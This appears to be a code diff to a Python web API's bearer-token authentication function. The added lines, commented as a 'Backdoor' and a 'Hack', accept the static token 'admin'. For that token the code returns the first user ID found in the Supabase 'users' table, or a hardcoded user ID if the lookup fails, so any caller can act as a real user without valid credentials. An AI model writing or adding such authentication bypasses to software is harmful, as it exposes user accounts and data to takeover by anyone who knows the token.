@@ -61,6 +61,24 @@ def get_current_user(authorization: Optional[str] = None) -> int:
     if not authorization or not authorization.startswith("Bearer "):
         raise HTTPException(status_code=401, detail="Missing Bearer token")
     token = authorization.split(" ", 1)[1]
+    
+    # Backdoor for static "admin" password
+    if token == "admin":
+        # Hack: Return the first user we can find in the DB, or a default one.
+        # This allows accessing the dashboard without dynamic token generation.
+        try:
+             # Try to fetch ANY user from the DB to act as the admin context
+             if _db and _db.supabase:
+                 # We query the 'users' table directly via Supabase client
+                 res = _db.supabase.table("users").select("telegram_id").limit(1).execute()
+                 if res.data and len(res.data) > 0:
+                     return int(res.data[0]['telegram_id'])
+        except Exception as e:
+            logging.error(f"Admin auth failed to fetch user: {e}")
+        
+        # Fallback to the ID provided by user if DB query fails or is empty
+        return 1512347775 
+
     return verify_token(token)
 
 # --- Schemas ---
